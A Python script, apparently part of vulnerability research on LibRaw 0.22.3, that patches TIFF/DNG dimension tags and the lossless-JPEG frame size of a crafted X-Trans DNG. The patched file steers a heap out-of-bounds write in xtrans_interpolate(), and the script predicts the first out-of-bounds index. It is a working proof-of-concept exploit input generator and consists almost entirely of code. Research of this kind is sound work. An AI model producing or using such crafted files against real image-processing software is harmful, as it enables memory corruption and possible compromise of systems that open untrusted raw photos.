#!/usr/bin/env python3
"""Lab-only experiment: steer the first OOB index by changing X-Trans frame size.

Base: evidence/nonzero-oob.input (full-field 512x512 X-Trans DNG made by
craft_nonzero_poc.py). TIFF ImageWidth/ImageLength/RowsPerStrip, DNG ActiveArea,
StripByteCounts and the embedded lossless-JPEG SOF3 frame size are changed
together to D x D; zero scan bytes are grown with the frame area.

LIBRAW_AHD_TILE is 512, so xtrans_interpolate() rejects a smaller frame;
only D >= 512 is reachable in the unmodified consumer.

Prediction from pinned 0.22.3 bytes: raw2image_start() halves iwidth/iheight
under shrink==1, pre_interpolate() leaves them stale at D/2, and
xtrans_interpolate():176 allocates (D/2+6)^2 ushort[4] elements while :427
stores with the full D stride. First OOB element index = (D/2+6)^2
(68,644 at D=512, matching the committed gdb traces).

No network use. Deterministic from the pinned input.
usage: craft_dimension_poc.py SRC DST D
"""
import struct
import sys

src, dst, dim = sys.argv[1], sys.argv[2], int(sys.argv[3])
d = bytearray(open(src, "rb").read())
assert dim >= 512 and dim <= 2048 and dim % 2 == 0
assert d[:2] == b"II" and len(d) == 263141
assert d[0x1E6:0x1EA] == b"\xff\xc3\x00\x0b"  # SOF3, 12-bit lossless JPEG
scan = 20000 * (dim // 512) ** 2
strip_end = 532 + scan
assert strip_end < 262144  # leave the 6x6 CFA pattern intact
ifd = struct.unpack_from("<I", d, 4)[0]
n = struct.unpack_from("<H", d, ifd)[0]
seen = set()
for i in range(n):
    e = ifd + 2 + 12 * i
    tag, typ, cnt = struct.unpack_from("<HHI", d, e)
    if tag in (0x100, 0x101, 0x116):  # width, height, rows per strip
        assert struct.unpack_from("<I", d, e + 8)[0] == 512
        struct.pack_into("<I", d, e + 8, dim)
        seen.add(tag)
    if tag == 0xC68D:  # DNG ActiveArea: top, left, bottom, right
        assert typ == 4 and cnt == 4
        off = struct.unpack_from("<I", d, e + 8)[0]
        assert struct.unpack_from("<4I", d, off) == (0, 0, 512, 512)
        struct.pack_into("<4I", d, off, 0, 0, dim, dim)
        seen.add(tag)
    if tag == 0x117:  # StripByteCounts: 48 original bytes + zero scan bytes
        assert typ == 4 and struct.unpack_from("<I", d, e + 8)[0] == 20048
        struct.pack_into("<I", d, e + 8, 48 + scan)
        seen.add(tag)
assert seen == {0x100, 0x101, 0x116, 0x117, 0xC68D}

# SOF3 fields are big-endian: precision 12, height/width D.
assert struct.unpack_from(">H", d, 0x1EB)[0] == 512
assert struct.unpack_from(">H", d, 0x1ED)[0] == 512
struct.pack_into(">H", d, 0x1EB, dim)
struct.pack_into(">H", d, 0x1ED, dim)

for i in range(532, strip_end):
    d[i] = 0

open(dst, "wb").write(d)
print(f"wrote {dst} D={dim} scan={scan} predicted_first_OOB={(dim // 2 + 6) ** 2}")
